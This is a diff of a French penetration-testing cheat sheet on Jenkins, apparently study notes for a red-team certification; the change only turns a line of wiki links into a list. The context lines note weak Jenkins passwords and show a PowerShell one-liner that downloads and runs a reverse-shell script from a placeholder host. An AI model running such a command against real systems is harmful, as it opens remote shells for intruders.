@@ -36,4 +36,8 @@ Jenkins n'a souvent pas de politique de mot de passe — tester `username = pass
 powershell.exe iex (iwr http://<IP>/Invoke-PowerShellTcp.ps1 -UseBasicParsing)
 ```
 
-**Link** — [[Enumeration]] · [[Cheatsheet - Lateral movement]] · [[Cheatsheet - Post-exploitation]] · [[Checklist - Méthodologie CRTP]]
+**Link**
+- [[Enumeration]]
+- [[Cheatsheet - Lateral movement]]
+- [[Cheatsheet - Post-exploitation]]
+- [[Checklist - Méthodologie CRTP]]
